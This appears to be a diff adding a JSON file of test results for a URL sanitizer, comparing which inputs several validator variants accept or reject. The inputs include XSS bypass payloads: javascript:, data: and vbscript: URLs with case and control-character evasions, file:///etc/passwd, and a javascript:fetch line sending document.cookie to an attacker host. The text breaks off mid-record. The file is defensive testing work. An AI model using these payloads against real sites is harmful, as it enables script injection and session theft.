@@ -1,0 +1,3052 @@
+[
+ {
+  "id": 1,
+  "cls": "javascript:",
+  "c2": false,
+  "main": "R",
+  "branch": "R",
+  "got": {
+   "MAIN.pristine": {
+    "verdict": "R",
+    "threw": null
+   },
+   "MAIN.disarmed": {
+    "verdict": "A",
+    "value": "javascript:alert(1)",
+    "threw": null
+   },
+   "BRANCH.blocking": {
+    "verdict": "R",
+    "value": null,
+    "threw": null
+   },
+   "BRANCH.carveout": {
+    "verdict": "R",
+    "value": null,
+    "threw": null
+   },
+   "BRANCH.disarmed": {
+    "verdict": "A",
+    "value": "javascript:alert(1)",
+    "threw": null
+   }
+  }
+ },
+ {
+  "id": 2,
+  "cls": "javascript: exfiltration",
+  "c2": false,
+  "main": "R",
+  "branch": null,
+  "got": {
+   "MAIN.pristine": {
+    "verdict": "R",
+    "threw": null
+   },
+   "MAIN.disarmed": {
+    "verdict": "A",
+    "value": "javascript:fetch('//attacker/'+document.cookie)",
+    "threw": null
+   },
+   "BRANCH.blocking": {
+    "verdict": "R",
+    "value": null,
+    "threw": null
+   },
+   "BRANCH.carveout": {
+    "verdict": "R",
+    "value": null,
+    "threw": null
+   },
+   "BRANCH.disarmed": {
+    "verdict": "A",
+    "value": "javascript:fetch('//attacker/'+document.cookie)",
+    "threw": null
+   }
+  }
+ },
+ {
+  "id": 3,
+  "cls": "case variation",
+  "c2": false,
+  "main": "R",
+  "branch": null,
+  "got": {
+   "MAIN.pristine": {
+    "verdict": "R",
+    "threw": null
+   },
+   "MAIN.disarmed": {
+    "verdict": "A",
+    "value": "JaVaScRiPt:alert(1)",
+    "threw": null
+   },
+   "BRANCH.blocking": {
+    "verdict": "R",
+    "value": null,
+    "threw": null
+   },
+   "BRANCH.carveout": {
+    "verdict": "R",
+    "value": null,
+    "threw": null
+   },
+   "BRANCH.disarmed": {
+    "verdict": "A",
+    "value": "JaVaScRiPt:alert(1)",
+    "threw": null
+   }
+  }
+ },
+ {
+  "id": 4,
+  "cls": "case variation",
+  "c2": false,
+  "main": null,
+  "branch": "R",
+  "got": {
+   "MAIN.pristine": {
+    "verdict": "R",
+    "threw": null
+   },
+   "MAIN.disarmed": {
+    "verdict": "A",
+    "value": "JavaScript:alert(1)",
+    "threw": null
+   },
+   "BRANCH.blocking": {
+    "verdict": "R",
+    "value": null,
+    "threw": null
+   },
+   "BRANCH.carveout": {
+    "verdict": "R",
+    "value": null,
+    "threw": null
+   },
+   "BRANCH.disarmed": {
+    "verdict": "A",
+    "value": "JavaScript:alert(1)",
+    "threw": null
+   }
+  }
+ },
+ {
+  "id": 5,
+  "cls": "case variation",
+  "c2": false,
+  "main": "R",
+  "branch": "R",
+  "got": {
+   "MAIN.pristine": {
+    "verdict": "R",
+    "threw": null
+   },
+   "MAIN.disarmed": {
+    "verdict": "A",
+    "value": "JAVASCRIPT:alert(1)",
+    "threw": null
+   },
+   "BRANCH.blocking": {
+    "verdict": "R",
+    "value": null,
+    "threw": null
+   },
+   "BRANCH.carveout": {
+    "verdict": "R",
+    "value": null,
+    "threw": null
+   },
+   "BRANCH.disarmed": {
+    "verdict": "A",
+    "value": "JAVASCRIPT:alert(1)",
+    "threw": null
+   }
+  }
+ },
+ {
+  "id": 6,
+  "cls": "leading control char",
+  "c2": false,
+  "main": "R",
+  "branch": "R",
+  "got": {
+   "MAIN.pristine": {
+    "verdict": "R",
+    "threw": null
+   },
+   "MAIN.disarmed": {
+    "verdict": "A",
+    "value": "\tjavascript:alert(1)",
+    "threw": null
+   },
+   "BRANCH.blocking": {
+    "verdict": "R",
+    "value": null,
+    "threw": null
+   },
+   "BRANCH.carveout": {
+    "verdict": "R",
+    "value": null,
+    "threw": null
+   },
+   "BRANCH.disarmed": {
+    "verdict": "A",
+    "value": "\tjavascript:alert(1)",
+    "threw": null
+   }
+  }
+ },
+ {
+  "id": 7,
+  "cls": "leading control char",
+  "c2": false,
+  "main": "R",
+  "branch": "R",
+  "got": {
+   "MAIN.pristine": {
+    "verdict": "R",
+    "threw": null
+   },
+   "MAIN.disarmed": {
+    "verdict": "A",
+    "value": "\njavascript:alert(1)",
+    "threw": null
+   },
+   "BRANCH.blocking": {
+    "verdict": "R",
+    "value": null,
+    "threw": null
+   },
+   "BRANCH.carveout": {
+    "verdict": "R",
+    "value": null,
+    "threw": null
+   },
+   "BRANCH.disarmed": {
+    "verdict": "A",
+    "value": "\njavascript:alert(1)",
+    "threw": null
+   }
+  }
+ },
+ {
+  "id": 8,
+  "cls": "leading whitespace",
+  "c2": false,
+  "main": "R",
+  "branch": null,
+  "got": {
+   "MAIN.pristine": {
+    "verdict": "R",
+    "threw": null
+   },
+   "MAIN.disarmed": {
+    "verdict": "A",
+    "value": " javascript:alert(1)",
+    "threw": null
+   },
+   "BRANCH.blocking": {
+    "verdict": "R",
+    "value": null,
+    "threw": null
+   },
+   "BRANCH.carveout": {
+    "verdict": "R",
+    "value": null,
+    "threw": null
+   },
+   "BRANCH.disarmed": {
+    "verdict": "A",
+    "value": " javascript:alert(1)",
+    "threw": null
+   }
+  }
+ },
+ {
+  "id": 9,
+  "cls": "surrounding whitespace",
+  "c2": false,
+  "main": null,
+  "branch": "R",
+  "got": {
+   "MAIN.pristine": {
+    "verdict": "R",
+    "threw": null
+   },
+   "MAIN.disarmed": {
+    "verdict": "A",
+    "value": "  javascript:alert(1)  ",
+    "threw": null
+   },
+   "BRANCH.blocking": {
+    "verdict": "R",
+    "value": null,
+    "threw": null
+   },
+   "BRANCH.carveout": {
+    "verdict": "R",
+    "value": null,
+    "threw": null
+   },
+   "BRANCH.disarmed": {
+    "verdict": "A",
+    "value": "  javascript:alert(1)  ",
+    "threw": null
+   }
+  }
+ },
+ {
+  "id": 10,
+  "cls": "embedded control char",
+  "c2": false,
+  "main": "R",
+  "branch": "R",
+  "got": {
+   "MAIN.pristine": {
+    "verdict": "R",
+    "threw": null
+   },
+   "MAIN.disarmed": {
+    "verdict": "A",
+    "value": "java\tscript:alert(1)",
+    "threw": null
+   },
+   "BRANCH.blocking": {
+    "verdict": "R",
+    "value": null,
+    "threw": null
+   },
+   "BRANCH.carveout": {
+    "verdict": "R",
+    "value": null,
+    "threw": null
+   },
+   "BRANCH.disarmed": {
+    "verdict": "A",
+    "value": "java\tscript:alert(1)",
+    "threw": null
+   }
+  }
+ },
+ {
+  "id": 11,
+  "cls": "embedded newline",
+  "c2": false,
+  "main": "R",
+  "branch": null,
+  "got": {
+   "MAIN.pristine": {
+    "verdict": "R",
+    "threw": null
+   },
+   "MAIN.disarmed": {
+    "verdict": "A",
+    "value": "java\nscript:alert(1)",
+    "threw": null
+   },
+   "BRANCH.blocking": {
+    "verdict": "R",
+    "value": null,
+    "threw": null
+   },
+   "BRANCH.carveout": {
+    "verdict": "R",
+    "value": null,
+    "threw": null
+   },
+   "BRANCH.disarmed": {
+    "verdict": "A",
+    "value": "java\nscript:alert(1)",
+    "threw": null
+   }
+  }
+ },
+ {
+  "id": 12,
+  "cls": "embedded CR",
+  "c2": false,
+  "main": "R",
+  "branch": null,
+  "got": {
+   "MAIN.pristine": {
+    "verdict": "R",
+    "threw": null
+   },
+   "MAIN.disarmed": {
+    "verdict": "A",
+    "value": "java\rscript:alert(1)",
+    "threw": null
+   },
+   "BRANCH.blocking": {
+    "verdict": "R",
+    "value": null,
+    "threw": null
+   },
+   "BRANCH.carveout": {
+    "verdict": "R",
+    "value": null,
+    "threw": null
+   },
+   "BRANCH.disarmed": {
+    "verdict": "A",
+    "value": "java\rscript:alert(1)",
+    "threw": null
+   }
+  }
+ },
+ {
+  "id": 13,
+  "cls": "embedded DEL",
+  "c2": false,
+  "main": "R",
+  "branch": null,
+  "got": {
+   "MAIN.pristine": {
+    "verdict": "R",
+    "threw": null
+   },
+   "MAIN.disarmed": {
+    "verdict": "A",
+    "value": "javascript:alert(1)",
+    "threw": null
+   },
+   "BRANCH.blocking": {
+    "verdict": "R",
+    "value": null,
+    "threw": null
+   },
+   "BRANCH.carveout": {
+    "verdict": "R",
+    "value": null,
+    "threw": null
+   },
+   "BRANCH.disarmed": {
+    "verdict": "A",
+    "value": "javascript:alert(1)",
+    "threw": null
+   }
+  }
+ },
+ {
+  "id": 14,
+  "cls": "nested scheme w/ authority",
+  "c2": false,
+  "main": "R",
+  "branch": null,
+  "got": {
+   "MAIN.pristine": {
+    "verdict": "R",
+    "threw": null
+   },
+   "MAIN.disarmed": {
+    "verdict": "A",
+    "value": "javascript://evil.com/%0aalert(1)",
+    "threw": null
+   },
+   "BRANCH.blocking": {
+    "verdict": "R",
+    "value": null,
+    "threw": null
+   },
+   "BRANCH.carveout": {
+    "verdict": "R",
+    "value": null,
+    "threw": null
+   },
+   "BRANCH.disarmed": {
+    "verdict": "A",
+    "value": "javascript://evil.com/%0aalert(1)",
+    "threw": null
+   }
+  }
+ },
+ {
+  "id": 15,
+  "cls": "data:",
+  "c2": false,
+  "main": "R",
+  "branch": "R",
+  "got": {
+   "MAIN.pristine": {
+    "verdict": "R",
+    "threw": null
+   },
+   "MAIN.disarmed": {
+    "verdict": "A",
+    "value": "data:text/html,<script>alert(1)</script>",
+    "threw": null
+   },
+   "BRANCH.blocking": {
+    "verdict": "R",
+    "value": null,
+    "threw": null
+   },
+   "BRANCH.carveout": {
+    "verdict": "R",
+    "value": null,
+    "threw": null
+   },
+   "BRANCH.disarmed": {
+    "verdict": "A",
+    "value": "data:text/html,<script>alert(1)</script>",
+    "threw": null
+   }
+  }
+ },
+ {
+  "id": 16,
+  "cls": "data: base64",
+  "c2": false,
+  "main": "R",
+  "branch": null,
+  "got": {
+   "MAIN.pristine": {
+    "verdict": "R",
+    "threw": null
+   },
+   "MAIN.disarmed": {
+    "verdict": "A",
+    "value": "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
+    "threw": null
+   },
+   "BRANCH.blocking": {
+    "verdict": "R",
+    "value": null,
+    "threw": null
+   },
+   "BRANCH.carveout": {
+    "verdict": "R",
+    "value": null,
+    "threw": null
+   },
+   "BRANCH.disarmed": {
+    "verdict": "A",
+    "value": "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
+    "threw": null
+   }
+  }
+ },
+ {
+  "id": 17,
+  "cls": "data: with authority",
+  "c2": false,
+  "main": "R",
+  "branch": null,
+  "got": {
+   "MAIN.pristine": {
+    "verdict": "R",
+    "threw": null
+   },
+   "MAIN.disarmed": {
+    "verdict": "A",
+    "value": "data://evil.com/x",
+    "threw": null
+   },
+   "BRANCH.blocking": {
+    "verdict": "R",
+    "value": null,
+    "threw": null
+   },
+   "BRANCH.carveout": {
+    "verdict": "R",
+    "value": null,
+    "threw": null
+   },
+   "BRANCH.disarmed": {
+    "verdict": "A",
+    "value": "data://evil.com/x",
+    "threw": null
+   }
+  }
+ },
+ {
+  "id": 18,
+  "cls": "vbscript:",
+  "c2": false,
+  "main": "R",
+  "branch": "R",
+  "got": {
+   "MAIN.pristine": {
+    "verdict": "R",
+    "threw": null
+   },
+   "MAIN.disarmed": {
+    "verdict": "A",
+    "value": "vbscript:msgbox(1)",
+    "threw": null
+   },
+   "BRANCH.blocking": {
+    "verdict": "R",
+    "value": null,
+    "threw": null
+   },
+   "BRANCH.carveout": {
+    "verdict": "R",
+    "value": null,
+    "threw": null
+   },
+   "BRANCH.disarmed": {
+    "verdict": "A",
+    "value": "vbscript:msgbox(1)",
+    "threw": null
+   }
+  }
+ },
+ {
+  "id": 19,
+  "cls": "blob:",
+  "c2": false,
+  "main": "R",
+  "branch": null,
+  "got": {
+   "MAIN.pristine": {
+    "verdict": "R",
+    "threw": null
+   },
+   "MAIN.disarmed": {
+    "verdict": "A",
+    "value": "blob:https://example.com/uuid",
+    "threw": null
+   },
+   "BRANCH.blocking": {
+    "verdict": "R",
+    "value": null,
+    "threw": null
+   },
+   "BRANCH.carveout": {
+    "verdict": "R",
+    "value": null,
+    "threw": null
+   },
+   "BRANCH.disarmed": {
+    "verdict": "A",
+    "value": "blob:https://example.com/uuid",
+    "threw": null
+   }
+  }
+ },
+ {
+  "id": 20,
+  "cls": "blob:",
+  "c2": false,
+  "main": null,
+  "branch": "R",
+  "got": {
+   "MAIN.pristine": {
+    "verdict": "R",
+    "threw": null
+   },
+   "MAIN.disarmed": {
+    "verdict": "A",
+    "value": "blob:https://example.com/abc",
+    "threw": null
+   },
+   "BRANCH.blocking": {
+    "verdict": "R",
+    "value": null,
+    "threw": null
+   },
+   "BRANCH.carveout": {
+    "verdict": "R",
+    "value": null,
+    "threw": null
+   },
+   "BRANCH.disarmed": {
+    "verdict": "A",
+    "value": "blob:https://example.com/abc",
+    "threw": null
+   }
+  }
+ },
+ {
+  "id": 21,
+  "cls": "file:",
+  "c2": false,
+  "main": "R",
+  "branch": "R",
+  "got": {
+   "MAIN.pristine": {
+    "verdict": "R",
+    "threw": null
+   },
+   "MAIN.disarmed": {
+    "verdict": "A",
+    "value": "file:///etc/passwd",
+    "threw": null
+   },
+   "BRANCH.blocking": {
+    "verdict": "R",
+    "value": null,
+    "threw": null
+   },
+   "BRANCH.carveout": {
+    "verdict": "R",
+    "value": null,
+    "threw": null
+   },
+   "BRANCH.disarmed": {
+    "verdict": "A",
+    "value": "file:///etc/passwd",
+    "threw": null
+   }
+  }
+ },
+ {
+  "id": 22,
+  "cls": "mailto:",
+  "c2": false,
+  "main": "R",
+  "branch": null,
+  "got": {
+   "MAIN.pristine": {
+    "verdict": "R",
+    "threw": null
+   },
+   "MAIN.disarmed": {
+    "verdict": "A",
+    "value": "mailto:a@b.com",
+    "threw": null
+   },
+   "BRANCH.blocking": {
+    "verdict": "R",
+    "value": null,
+    "threw": null
+   },
+   "BRANCH.carveout": {
+    "verdict": "R",
+    "value": null,
+    "threw": null
+   },
+   "BRANCH.disarmed": {
+    "verdict": "A",
+    "value": "mailto:a@b.com",
+    "threw": null
+   }
+  }
+ },
+ {
+  "id": 23,
+  "cls": "non-allowlisted special scheme",
+  "c2": false,
+  "main": "R",
+  "branch": null,
+  "got": {
+   "MAIN.pristine": {
+    "verdict": "R",
+    "threw": null
+   },
+   "MAIN.disarmed": {
+    "verdict": "A",
+    "value": "ftp://evil.com/x",
+    "threw": null
+   },
+   "BRANCH.blocking": {
+    "verdict": "R",
+    "value": null,
+    "threw": null
+   },
+   "BRANCH.carveout": {
+    "verdict": "R",
+    "value": null,
+    "threw": null
+   },
+   "BRANCH.disarmed": {
+    "verdict": "A",
+    "value": "ftp://evil.com/x",
+    "threw": null
+   }
+  }
+ },
+ {
+  "id": 24,
+  "cls": "non-allowlisted special scheme",
+  "c2": false,
+  "main": null,
+  "branch": "R",
+  "got": {
+   "MAIN.pristine": {
+    "verdict": "R",
+    "threw": null
+   },
+   "MAIN.disarmed": {
+    "verdict": "A",
+    "value": "ftp://example.com/x",
+    "threw": null
+   },
+   "BRANCH.blocking": {
+    "verdict": "R",
+    "value": null,
+    "threw": null
+   },
+   "BRANCH.carveout": {
+    "verdict": "R",
+    "value": null,
+    "threw": null
+   },
+   "BRANCH.disarmed": {
+    "verdict": "A",
+    "value": "ftp://example.com/x",
+    "threw": null
+   }
+  }
+ },
+ {
+  "id": 25,
+  "cls": "non-allowlisted special scheme",
+  "c2": false,
+  "main": "R",
+  "branch": null,
+  "got": {
+   "MAIN.pristine": {
+    "verdict": "R",
+    "threw": null
+   },
+   "MAIN.disarmed": {
+    "verdict": "A",
+    "value": "ws://evil.com/x",
+    "threw": null
+   },
+   "BRANCH.blocking": {
+    "verdict": "R",
+    "value": null,
+    "threw": null
+   },
+   "BRANCH.carveout": {
+    "verdict": "R",
+    "value": null,
+    "threw": null
+   },
+   "BRANCH.disarmed": {
+    "verdict": "A",
+    "value": "ws://evil.com/x",
+    "threw": null
+   }
+  }
+ },
+ {
+  "id": 26,
+  "cls": "non-allowlisted special scheme",
+  "c2": false,
+  "main": "R",
+  "branch": null,
+  "got": {
+   "MAIN.pristine": {
+    "verdict": "R",
+    "threw": null
+   },
+   "MAIN.disarmed": {
+    "verdict": "A",
+    "value": "wss://evil.com/x",
+    "threw": null
+   },
+   "BRANCH.blocking": {
+    "verdict": "R",
+    "value": null,
+    "threw": null
+   },
+   "BRANCH.carveout": {
+    "verdict": "R",
+    "value": null,
+    "threw": null
+   },
+   "BRANCH.disarmed": {
+    "verdict": "A",
+    "value": "wss://evil.com/x",
+    "threw": null
+   }
+  }
+ },
+ {
+  "id": 27,
+  "cls": "prefix-vs-membership",
+  "c2": false,
+  "main": "R",
+  "branch": null,
+  "got": {
+   "MAIN.pristine": {
+    "verdict": "R",
+    "threw": null
+   },
+   "MAIN.disarmed": {
+    "verdict": "A",
+    "value": "httpx://evil.com/x",
+    "threw": null
+   },
+   "BRANCH.blocking": {
+    "verdict": "R",
+    "value": null,
+    "threw": null
+   },
+   "BRANCH.carveout": {
+    "verdict": "R",
+    "value": null,
+    "threw": null
+   },
+   "BRANCH.disarmed": {
+    "verdict": "A",
+    "value": "httpx://evil.com/x",
+    "threw": null
+   }
+  }
+ },
+ {
+  "id": 28,
+  "cls": "empty input",
+  "c2": false,
+  "main": "R",
+  "branch": "R",
+  "got": {
+   "MAIN.pristine": {
+    "verdict": "R",
+    "threw": null
+   },
+   "MAIN.disarmed": {
+    "verdict": "A",
+    "value": "",
+    "threw": null
+   },
+   "BRANCH.blocking": {
+    "verdict": "R",
+    "value": null,
+    "threw": null
+   },
+   "BRANCH.carveout": {
+    "verdict": "R",
+    "value": null,
+    "threw": null
+   },
+   "BRANCH.disarmed": {
+    "verdict": "A",
+    "value": "",
+    "threw": null
+   }
+  }
+ },
+ {
+  "id": 29,
+  "cls": "whitespace-only input",
+  "c2": false,
+  "main": null,
+  "branch": "R",
+  "got": {
+   "MAIN.pristine": {
+    "verdict": "R",
+    "threw": null
+   },
+   "MAIN.disarmed": {
+    "verdict": "A",
+    "value": "   ",
+    "threw": null
+   },
+   "BRANCH.blocking": {
+    "verdict": "R",
+    "value": null,
+    "threw": null
+   },
+   "BRANCH.carveout": {
+    "verdict": "R",
+    "value": null,
+    "threw": null
+   },
+   "BRANCH.disarmed": {
+    "verdict": "A",
+    "value": "   ",
+    "threw": null
+   }
+  }
+ },
+ {
+  "id": 30,
+  "cls": "null input",
+  "c2": false,
+  "main": "R",
+  "branch": "R",
+  "got": {
+   "MAIN.pristine": {
+    "verdict": "R",
+    "threw": null
+   },
+   "MAIN.disarmed": {
+    "verdict": "R",
+    "threw": null
+   },
+   "BRANCH.blocking": {
+    "verdict": "R",
+    "value": null,
+    "threw": null
+   },
+   "BRANCH.carveout": {
+    "verdict": "R",
+    "value": null,
+    "threw": null
+   },
+   "BRANCH.disarmed": {
+    "verdict": "R",
+    "value": null,
+    "threw": null
+   }
+  }
+ },
+ {
+  "id": 31,
+  "cls": "undefined input",
+  "c2": false,
+  "main": "R",
+  "branch": "R",
+  "got": {
+   "MAIN.pristine": {
+    "verdict": "R",
+    "threw": null
+   },
+   "MAIN.disarmed": {
+    "verdict": "R",
+    "threw": null
+   },
+   "BRANCH.blocking": {
+    "verdict": "R",
+    "value": null,
+    "threw": null
+   },
+   "BRANCH.carveout": {
+    "verdict": "R",
+    "value": null,
+    "threw": null
+   },
+   "BRANCH.disarmed": {
+    "verdict": "R",
+    "value": null,
+    "threw": null
+   }
+  }
+ },
+ {
+  "id": 32,
+  "cls": "bare word",
+  "c2": false,
+  "main": "R",
+  "branch": null,
+  "got": {
+   "MAIN.pristine": {
+    "verdict": "R",
+    "threw": null
+   },
+   "MAIN.disarmed": {
+    "verdict": "A",
+    "value": "not-a-url",
+    "threw": null
+   },
+   "BRANCH.blocking": {
+    "verdict": "R",
+    "value": null,
+    "threw": null
+   },
+   "BRANCH.carveout": {
+    "verdict": "R",
+    "value": null,
+    "threw": null
+   },
+   "BRANCH.disarmed": {
+    "verdict": "A",
+    "value": "not-a-url",
+    "threw": null
+   }
+  }
+ },
+ {
+  "id": 33,
+  "cls": "bare word with space",
+  "c2": false,
+  "main": null,
+  "branch": "R",
+  "got": {
+   "MAIN.pristine": {
+    "verdict": "R",
+    "threw": null
+   },
+   "MAIN.disarmed": {
+    "verdict": "A",
+    "value": "not a url",
+    "threw": null
+   },
+   "BRANCH.blocking": {
+    "verdict": "R",
+    "value": null,
+    "threw": null
+   },
+   "BRANCH.carveout": {
+    "verdict": "R",
+    "value": null,
+    "threw": null
+   },
+   "BRANCH.disarmed": {
+    "verdict": "A",
+    "value": "not a url",
+    "threw": null
+   }
+  }
+ },
+ {
+  "id": 34,
+  "cls": "absolute-path relative ref",
+  "c2": false,
+  "main": "R",
+  "branch": "R",
+  "got": {
+   "MAIN.pristine": {
+    "verdict": "R",
+    "threw": null
+   },
+   "MAIN.disarmed": {
+    "verdict": "A",
+    "value": "/relative/path",
+    "threw": null
+   },
+   "BRANCH.blocking": {
+    "verdict": "R",
+    "value": null,
+    "threw": null
+   },
+   "BRANCH.carveout": {
+    "verdict": "R",
+    "value": null,
+    "threw": null
+   },
+   "BRANCH.disarmed": {
+    "verdict": "A",
+    "value": "/relative/path",
+    "threw": null
+   }
+  }
+ },
+ {
+  "id": 35,
+  "cls": "protocol-relative",
+  "c2": false,
+  "main": "R",
+  "branch": null,
+  "got": {
+   "MAIN.pristine": {
+    "verdict": "R",
+    "threw": null
+   },
+   "MAIN.disarmed": {
+    "verdict": "A",
+    "value": "//evil.com/x",
+    "threw": null
+   },
+   "BRANCH.blocking": {
+    "verdict": "R",
+    "value": null,
+    "threw": null
+   },
+   "BRANCH.carveout": {
+    "verdict": "R",
+    "value": null,
+    "threw": null
+   },
+   "BRANCH.disarmed": {
+    "verdict": "A",
+    "value": "//evil.com/x",
+    "threw": null
+   }
+  }
+ },
+ {
+  "id": 36,
+  "cls": "protocol-relative",
+  "c2": false,
+  "main": null,
+  "branch": "R",
+  "got": {
+   "MAIN.pristine": {
+    "verdict": "R",
+    "threw": null
+   },
+   "MAIN.disarmed": {
+    "verdict": "A",
+    "value": "//example.com/x",
+    "threw": null
+   },
+   "BRANCH.blocking": {
+    "verdict": "R",
+    "value": null,
+    "threw": null
+   },
+   "BRANCH.carveout": {
+    "verdict": "R",
+    "value": null,
+    "threw": null
+   },
+   "BRANCH.disarmed": {
+    "verdict": "A",
+    "value": "//example.com/x",
+    "threw": null
+   }
+  }
+ },
+ {
+  "id": 37,
+  "cls": "scheme without host",
+  "c2": false,
+  "main": "R",
+  "branch": null,
+  "got": {
+   "MAIN.pristine": {
+    "verdict": "R",
+    "threw": null
+   },
+   "MAIN.disarmed": {
+    "verdict": "A",
+    "value": "http://",
+    "threw": null
+   },
+   "BRANCH.blocking": {
+    "verdict": "R",
+    "value": null,
+    "threw": null
+   },
+   "BRANCH.carveout": {
+    "verdict": "R",
+    "value": null,
+    "threw": null
+   },
+   "BRANCH.disarmed": {
+    "verdict": "A",
+    "value": "http://",
+    "threw": null
+   }
+  }
+ },
+ {
+  "id": 38,
+  "cls": "scheme without host",
+  "c2": false,
+  "main": null,
+  "branch": "R",
+  "got": {
+   "MAIN.pristine": {
+    "verdict": "R",
+    "threw": null
+   },
+   "MAIN.disarmed": {
+    "verdict": "A",
+    "value": "https://",
+    "threw": null
+   },
+   "BRANCH.blocking": {
+    "verdict": "R",
+    "value": null,
+    "threw": null
+   },
+   "BRANCH.carveout": {
+    "verdict": "R",
+    "value": null,
+    "threw": null
+   },
+   "BRANCH.disarmed": {
+    "verdict": "A",
+    "value": "https://",
+    "threw": null
+   }
+  }
+ },
+ {
+  "id": 39,
+  "cls": "malformed IPv6 host",
+  "c2": false,
+  "main": "R",
+  "branch": null,
+  "got": {
+   "MAIN.pristine": {
+    "verdict": "R",
+    "threw": null
+   },
+   "MAIN.disarmed": {
+    "verdict": "A",
+    "value": "http://[::1/x",
+    "threw": null
+   },
+   "BRANCH.blocking": {
+    "verdict": "R",
+    "value": null,
+    "threw": null
+   },
+   "BRANCH.carveout": {
+    "verdict": "R",
+    "value": null,
+    "threw": null
+   },
+   "BRANCH.disarmed": {
+    "verdict": "A",
+    "value": "http://[::1/x",
+    "threw": null
+   }
+  }
+ },
+ {
+  "id": 40,
+  "cls": "bare space in host",
+  "c2": false,
+  "main": "R",
+  "branch": null,
+  "got": {
+   "MAIN.pristine": {
+    "verdict": "R",
+    "threw": null
+   },
+   "MAIN.disarmed": {
+    "verdict": "A",
+    "value": "http://exa mple.com",
+    "threw": null
+   },
+   "BRANCH.blocking": {
+    "verdict": "R",
+    "value": null,
+    "threw": null
+   },
+   "BRANCH.carveout": {
+    "verdict": "R",
+    "value": null,
+    "threw": null
+   },
+   "BRANCH.disarmed": {
+    "verdict": "A",
+    "value": "http://exa mple.com",
+    "threw": null
+   }
+  }
+ },
+ {
+  "id": 41,
+  "cls": "out-of-range port",
+  "c2": false,
+  "main": "R",
+  "branch": null,
+  "got": {
+   "MAIN.pristine": {
+    "verdict": "R",
+    "threw": null
+   },
+   "MAIN.disarmed": {
+    "verdict": "A",
+    "value": "https://example.com:99999/x",
+    "threw": null
+   },
+   "BRANCH.blocking": {
+    "verdict": "R",
+    "value": null,
+    "threw": null
+   },
+   "BRANCH.carveout": {
+    "verdict": "R",
+    "value": null,
+    "threw": null
+   },
+   "BRANCH.disarmed": {
+    "verdict": "A",
+    "value": "https://example.com:99999/x",
+    "threw": null
+   }
+  }
+ },
+ {
+  "id": 42,
+  "cls": "allowed https",
+  "c2": false,
+  "main": "A",
+  "branch": null,
+  "got": {
+   "MAIN.pristine": {
+    "verdict": "A",
+    "value": "https://github.com/o/r/pull/1",
+    "threw": null
+   },
+   "MAIN.disarmed": {
+    "verdict": "A",
+    "value": "https://github.com/o/r/pull/1",
+    "threw": null
+   },
+   "BRANCH.blocking": {
+    "verdict": "A",
+    "value": "https://github.com/o/r/pull/1",
+    "threw": null
+   },
+   "BRANCH.carveout": {
+    "verdict": "A",
+    "value": "https://github.com/o/r/pull/1",
+    "threw": null
+   },
+   "BRANCH.disarmed": {
+    "verdict": "A",
+    "value": "https://github.com/o/r/pull/1",
+    "threw": null
+   }
+  }
+ },
+ {
+  "id": 43,
+  "cls": "allowed http (contested)",
+  "c2": true,
+  "main": "A",
+  "branch": null,
+  "got": {
+   "MAIN.pristine": {
+    "verdict": "A",
+    "value": "http://example.com/x",
+    "threw": null
+   },
+   "MAIN.disarmed": {
+    "verdict": "A",
+    "value": "http://example.com/x",
+    "threw": null
+   },
+   "BRANCH.blocking": {
+    "verdict": "R",
+    "value": null,
+    "threw": null
+   },
+   "BRANCH.carveout": {
+    "verdict": "R",
+    "value": null,
+    "threw": null
+   },
+   "BRANCH.disarmed": {
+    "verdict": "A",
+    "value": "http://example.com/x",
+    "threw": null
+   }
+  }
+ },
+ {
+  "id": 44,
+  "cls": "case variation, identity return",
+  "c2": false,
+  "main": "A",
+  "branch": null,
+  "got": {
+   "MAIN.pristine": {
+    "verdict": "A",
+    "value": "HtTpS://example.com",
+    "threw": null
+   },
+   "MAIN.disarmed": {
+    "verdict": "A",
+    "value": "HtTpS://example.com",
+    "threw": null
+   },
+   "BRANCH.blocking": {
+    "verdict": "A",
+    "value": "https://example.com/",
+    "threw": null
+   },
+   "BRANCH.carveout": {
+    "verdict": "A",
+    "value": "https://example.com/",
+    "threw": null
+   },
+   "BRANCH.disarmed": {
+    "verdict": "A",
+    "value": "HtTpS://example.com",
+    "threw": null
+   }
+  }
+ },
+ {
+  "id": 45,
+  "cls": "allowed https with port",
+  "c2": false,
+  "main": "A",
+  "branch": null,
+  "got": {
+   "MAIN.pristine": {
+    "verdict": "A",
+    "value": "https://example.com:8443/x",
+    "threw": null
+   },
+   "MAIN.disarmed": {
+    "verdict": "A",
+    "value": "https://example.com:8443/x",
+    "threw": null
+   },
+   "BRANCH.blocking": {
+    "verdict": "A",
+    "value": "https://example.com:8443/x",
+    "threw": null
+   },
+   "BRANCH.carveout": {
+    "verdict": "A",
+    "value": "https://example.com:8443/x",
+    "threw": null
+   },
+   "BRANCH.disarmed": {
+    "verdict": "A",
+    "value": "https://example.com:8443/x",
+    "threw": null
+   }
+  }
+ },
+ {
+  "id": 46,
+  "cls": "query+fragment",
+  "c2": false,
+  "main": "A",
+  "branch": null,
+  "got": {
+   "MAIN.pristine": {
+    "verdict": "A",
+    "value": "https://example.com/x?a=1&b=2#frag",
+    "threw": null
+   },
+   "MAIN.disarmed": {
+    "verdict": "A",
+    "value": "https://example.com/x?a=1&b=2#frag",
+    "threw": null
+   },
+   "BRANCH.blocking": {
+    "verdict": "A",
+    "value": "https://example.com/x?a=1&b=2#frag",
+    "threw": null
+   },
+   "BRANCH.carveout": {
+    "verdict": "A",
+    "value": "https://example.com/x?a=1&b=2#frag",
+    "threw": null
+   },
+   "BRANCH.disarmed": {
+    "verdict": "A",
+    "value": "https://example.com/x?a=1&b=2#frag",
+    "threw": null
+   }
+  }
+ },
+ {
+  "id": 47,
+  "cls": "userinfo (RULED: reject)",
+  "c2": false,
+  "main": "A",
+  "branch": null,
+  "got": {
+   "MAIN.pristine": {
+    "verdict": "A",
+    "value": "https://user:pass@example.com/x",
+    "threw": null
+   },
+   "MAIN.disarmed": {
+    "verdict": "A",
+    "value": "https://user:pass@example.com/x",
+    "threw": null
+   },
+   "BRANCH.blocking": {
+    "verdict": "R",
+    "value": null,
+    "threw": null
+   },
+   "BRANCH.carveout": {
+    "verdict": "R",
+    "value": null,
+    "threw": null
+   },
+   "BRANCH.disarmed": {
+    "verdict": "A",
+    "value": "https://user:pass@example.com/x",
+    "threw": null
+   }
+  }
+ },
+ {
+  "id": 48,
+  "cls": "case variation host/path",
+  "c2": false,
+  "main": "A",
+  "branch": null,
+  "got": {
+   "MAIN.pristine": {
+    "verdict": "A",
+    "value": "https://EXAMPLE.com/X",
